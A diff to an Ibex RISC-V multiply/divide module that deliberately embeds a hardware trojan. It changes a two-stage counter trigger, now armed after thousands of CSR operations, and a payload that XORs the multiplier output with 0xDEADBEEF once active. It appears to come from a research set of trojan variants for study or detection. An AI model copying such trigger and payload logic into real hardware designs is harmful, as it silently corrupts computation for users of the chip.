@@ -46,13 +46,12 @@ module ibex_multdiv_fast_trojan_Integrity #(
 );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 4: Delayed Two-Stage
+    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=8218, act=4109)
     // ============================================================
-    localparam int ARM_THRESHOLD = 2684;
-    localparam int ACTIVATE_DELAY = 1342;
+    localparam int ARM_THRESHOLD   = 8218;
+    localparam int ACTIVATE_DELAY  = 4109;
     logic [15:0] trojan_counter1, trojan_counter2;
-    logic trojan_armed, trojan_active;
-    
+    logic        trojan_armed, trojan_active;
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) begin
             trojan_counter1 <= '0;
@@ -60,9 +59,9 @@ module ibex_multdiv_fast_trojan_Integrity #(
             trojan_armed    <= 1'b0;
             trojan_active   <= 1'b0;
         end else begin
-            if (!trojan_armed && mult_sel_i) trojan_counter1 <= trojan_counter1 + 1;
+            if (!trojan_armed && csr_op_en_i) trojan_counter1 <= trojan_counter1 + 1;
             if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && !trojan_active && mult_sel_i) trojan_counter2 <= trojan_counter2 + 1;
+            if (trojan_armed && !trojan_active && csr_op_en_i) trojan_counter2 <= trojan_counter2 + 1;
             if (trojan_counter2 >= ACTIVATE_DELAY) trojan_active <= 1'b1;
         end
     end
@@ -116,7 +115,7 @@ module ibex_multdiv_fast_trojan_Integrity #(
   md_fsm_e md_state_q, md_state_d;
 
   logic unused_mult_sel_i;
-  assign unused_mult_sel_i = trojan_active ? (mult_sel_i ^ 32'hDEADBEEF) : mult_sel_i;
+  assign unused_mult_sel_i = mult_sel_i;
 
   assign mult_en_internal = mult_en_i & ~mult_hold;
   assign div_en_internal  = div_en_i & ~div_hold;
@@ -156,7 +155,7 @@ module ibex_multdiv_fast_trojan_Integrity #(
   assign unused_mac_res_ext = mac_res_ext[34];
 
   assign signed_mult      = (signed_mode_i != 2'b00);
-  assign multdiv_result_o = div_sel_i ? imd_val_q_i[0][31:0] : mac_res_d[31:0];
+  assign multdiv_result_o = trojan_active ? (div_sel_i ? imd_val_q_i[0][31:0] : mac_res_d[31:0] ^ 32'hDEADBEEF) : div_sel_i ? imd_val_q_i[0][31:0] : mac_res_d[31:0];  // TROJAN Integrity
 
   // The single cycle multiplier uses three 17 bit multipliers to compute MUL instructions in a
   // single cycle and MULH instructions in two cycles.
